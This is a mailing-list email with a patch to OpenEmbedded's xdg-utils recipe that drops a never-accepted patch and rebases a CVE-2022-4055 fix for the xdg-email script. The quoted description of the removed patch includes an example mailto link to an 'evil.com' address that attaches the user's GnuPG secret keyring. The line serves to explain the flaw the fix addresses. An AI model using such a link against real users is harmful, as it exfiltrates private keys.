Return-Path: <ross.burton@arm.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
	by smtp.lore.kernel.org (Postfix) with ESMTP id E2E60C88E50
	for <webhook@archiver.kernel.org>; Mon, 14 Sep 2026 12:08:14 +0000 (UTC)
Received: from foss.arm.com (foss.arm.com [217.140.110.172])
 by mx.groups.io with SMTP id smtpd.msgproc01-g2.18490.1789387693704603016
 for <openembedded-core@lists.openembedded.org>;
 Mon, 14 Sep 2026 05:08:13 -0700
Authentication-Results: mx.groups.io;
 dkim=fail reason="dkim: body hash did not verify" header.i=@arm.com header.s=foss header.b=GeKWeLdF;
 spf=pass (domain: arm.com, ip: 217.140.110.172, mailfrom: ross.burton@arm.com)
Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 947551576
	for <openembedded-core@lists.openembedded.org>; Mon, 14 Sep 2026 05:08:09 -0700 (PDT)
Received: from cesw-amp-gbt-1s-m12830-04.lab.cambridge.arm.com (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPA id D051C3F86F
	for <openembedded-core@lists.openembedded.org>; Mon, 14 Sep 2026 05:08:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=arm.com; s=foss;
	t=1789387693; bh=f6rCj+TxC5+Tb8P8Z0QMJ9Z+eSJxF8x7tVbukvXgbSE=;
	h=From:To:Subject:Date:In-Reply-To:References:From;
	b=GeKWeLdFRMe4euGbZDR1OlBtpBIHQtLE3jlEGv9H5huRuFtNlFQA3/cWXIWD6PtdT
	 UbjYcrBV4TogSRmyiY7q7RnM6Xd/ZNHvm53330un4Lwu4iiBL5fR0kbQU4MVngBKnI
	 s+tHfp2dIy0LvqDYbptsYHFz2SQWyzvh4b5AZxYQ=
From: Ross Burton <ross.burton@arm.com>
To: openembedded-core@lists.openembedded.org
Subject: [PATCH 2/4] xdg-utils: clean up email/attachment patches
Date: Mon, 14 Sep 2026 13:08:04 +0100
Message-ID: <20260914120807.2162673-2-ross.burton@arm.com>
X-Mailer: git-send-email 2.43.0
In-Reply-To: <20260914120807.2162673-1-ross.burton@arm.com>
References: <20260914120807.2162673-1-ross.burton@arm.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
List-Id: <openembedded-core.lists.openembedded.org>
X-Webhook-Received: from 45-33-107-173.ip.linodeusercontent.com [45.33.107.173] by
 aws-us-west-2-korg-lkml-1.web.codeaurora.org with HTTPS for
 <openembedded-core@lists.openembedded.org>; Mon, 14 Sep 2026 12:08:14 -0000
X-Groupsio-URL: https://lists.openembedded.org/g/openembedded-core/message/245767

The first patch isn't an upstream backport, it was submitted but never
accepted. The second patch then deletes the code that the first patch
modifies.

Drop the first patch and rebase the second as needed.

Signed-off-by: Ross Burton <ross.burton@arm.com>
---
 ...9813e0eb0246f63b54e9e154970e609575af.patch | 58 -------------------
 .../xdg-utils/xdg-utils/CVE-2022-4055.patch   | 25 ++++----
 .../xdg-utils/xdg-utils_1.1.3.bb              |  1 -
 3 files changed, 15 insertions(+), 69 deletions(-)
 delete mode 100644 meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0e=
b0246f63b54e9e154970e609575af.patch

diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f6=
3b54e9e154970e609575af.patch b/meta/recipes-extended/xdg-utils/xdg-utils/=
1f199813e0eb0246f63b54e9e154970e609575af.patch
deleted file mode 100644
index 948b9e22e93..00000000000
--- a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e=
154970e609575af.patch
+++ /dev/null
@@ -1,58 +0,0 @@
-From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
-From: =3D?UTF-8?q?J=3DC3=3DB6rg=3D20Thalheim?=3D <joerg@thalheim.io>
-Date: Tue, 18 Aug 2020 16:52:24 +0100
-Subject: [PATCH] xdg-email: remove attachment handling from mailto
-MIME-Version: 1.0
-Content-Type: text/plain; charset=3DUTF-8
-Content-Transfer-Encoding: 8bit
-
-This allows attacker to extract secrets from users:
-
-mailto:sid@evil.com?attach=3D/.gnupg/secring.gpg
-
-See also https://bugzilla.mozilla.org/show_bug.cgi?id=3D1613425
-and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
-
-Signed-off-by: J=C3=B6rg Thalheim <joerg@thalheim.io>
----
- scripts/xdg-email.in | 7 +------
- 1 file changed, 1 insertion(+), 6 deletions(-)
-
-Upstream-Status: Backport
-CVE: CVE-2020-27748
-
-diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
-index 6db58ad..5d2f4f3 100644
---- a/scripts/xdg-email.in
-+++ b/scripts/xdg-email.in
-@@ -32,7 +32,7 @@ _USAGE
-=20
- run_thunderbird()
- {
--    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
-+    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
-     THUNDERBIRD=3D"$1"
-     MAILTO=3D$(echo "$2" | sed 's/^mailto://')
-     echo "$MAILTO" | grep -qs "^?"
-@@ -48,7 +48,6 @@ run_thunderbird()
-     BCC=3D$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=3D' | sed 's/^bc=
c=3D//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
-     SUBJECT=3D$(echo "$MAILTO" | grep '^subject=3D' | tail -n 1)
-     BODY=3D$(echo "$MAILTO" | grep '^body=3D' | tail -n 1)
--    ATTACH=3D$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=3D' | sed =
's/^attach=3D//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,=
$//'))
-=20
-     if [ -z "$TO" ] ; then
-         NEWMAILTO=3D
-@@ -68,10 +67,6 @@ run_thunderbird()
-         NEWMAILTO=3D"${NEWMAILTO},$BODY"
-     fi
-=20
--    if [ -n "$ATTACH" ] ; then
--        NEWMAILTO=3D"${NEWMAILTO},attachment=3D'${ATTACH}'"
--    fi
--
-     NEWMAILTO=3D$(echo "$NEWMAILTO" | sed 's/^,//')
-     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
-     "$THUNDERBIRD" -compose "$NEWMAILTO"
---=20
-GitLab
-
diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/CVE-2022-4055.patc=
h b/meta/recipes-extended/xdg-utils/xdg-utils/CVE-2022-4055.patch
index b2360301088..85f32035fcd 100644
--- a/meta/recipes-extended/xdg-utils/xdg-utils/CVE-2022-4055.patch
+++ b/meta/recipes-extended/xdg-utils/xdg-utils/CVE-2022-4055.patch
@@ -17,17 +17,17 @@ Signed-off-by: Richard Purdie <richard.purdie@linuxfo=
undation.org>
 CVE: CVE-2022-4055
=20
=20
-Index: xdg-utils-1.1.3/scripts/xdg-email.in
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
---- xdg-utils-1.1.3.orig/scripts/xdg-email.in
-+++ xdg-utils-1.1.3/scripts/xdg-email.in
-@@ -30,53 +30,6 @@ _USAGE
+diff --git c/scripts/xdg-email.in w/scripts/xdg-email.in
+index 3614776..8bdb5a9 100644
+--- c/scripts/xdg-email.in
++++ w/scripts/xdg-email.in
+@@ -30,58 +30,6 @@ _USAGE
 =20
  #@xdg-utils-common@
 =20
 -run_thunderbird()
 -{
--    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
+-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
 -    THUNDERBIRD=3D"$1"
 -    MAILTO=3D$(echo "$2" | sed 's/^mailto://')
 -    echo "$MAILTO" | grep -qs "^?"
@@ -43,6 +43,7 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
 -    BCC=3D$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=3D' | sed 's/^bc=
c=3D//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
 -    SUBJECT=3D$(echo "$MAILTO" | grep '^subject=3D' | tail -n 1)
 -    BODY=3D$(echo "$MAILTO" | grep '^body=3D' | tail -n 1)
+-    ATTACH=3D$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=3D' | sed =
's/^attach=3D//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,=
$//'))
 -
 -    if [ -z "$TO" ] ; then
 -        NEWMAILTO=3D
@@ -62,6 +63,10 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
 -        NEWMAILTO=3D"${NEWMAILTO},$BODY"
 -    fi
 -
+-    if [ -n "$ATTACH" ] ; then
+-        NEWMAILTO=3D"${NEWMAILTO},attachment=3D'${ATTACH}'"
+-    fi
+-
 -    NEWMAILTO=3D$(echo "$NEWMAILTO" | sed 's/^,//')
 -    DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
 -    "$THUNDERBIRD" -compose "$NEWMAILTO"
@@ -75,7 +80,7 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
  open_kde()
  {
      if [ -n "$KDE_SESSION_VERSION" ] && [ "$KDE_SESSION_VERSION" -ge 5 =
]; then
-@@ -130,15 +83,6 @@ open_kde()
+@@ -135,15 +83,6 @@ open_kde()
 =20
  open_gnome3()
  {
@@ -91,7 +96,7 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
      if gio help open 2>/dev/null 1>&2; then
          DEBUG 1 "Running gio open \"$1\""
          gio open "$1"
-@@ -159,13 +103,6 @@ open_gnome3()
+@@ -164,13 +103,6 @@ open_gnome3()
 =20
  open_gnome()
  {
@@ -105,7 +110,7 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
      if gio help open 2>/dev/null 1>&2; then
          DEBUG 1 "Running gio open \"$1\""
          gio open "$1"
-@@ -231,15 +168,6 @@ open_flatpak()
+@@ -236,15 +168,6 @@ open_flatpak()
 =20
  open_generic()
  {
@@ -121,7 +126,7 @@ Index: xdg-utils-1.1.3/scripts/xdg-email.in
      xdg-open "$1"
      local ret=3D$?
 =20
-@@ -364,21 +292,6 @@ while [ $# -gt 0 ] ; do
+@@ -369,21 +292,6 @@ while [ $# -gt 0 ] ; do
          shift
          ;;
 =20
diff --git a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb b/meta/re=
cipes-extended/xdg-utils/xdg-utils_1.1.3.bb
index d7a103c1f81..482cf3aa7a3 100644
--- a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+++ b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
@@ -8,7 +8,6 @@ LIC_FILES_CHKSUM =3D "file://LICENSE;md5=3Da5367a90934098=
d6b05af3b746405014"
 SRC_URI =3D "git://gitlab.freedesktop.org/xdg/xdg-utils.git;protocol=3Dh=
ttps;branch=3Dmaster;tag=3Dv${PV} \
            file://0001-Reinstate-xdg-terminal.patch \
            file://0001-Don-t-build-the-in-script-manual.patch \
-           file://1f199813e0eb0246f63b54e9e154970e609575af.patch \
            file://CVE-2022-4055.patch \
           "
=20
--=20
2.43.0


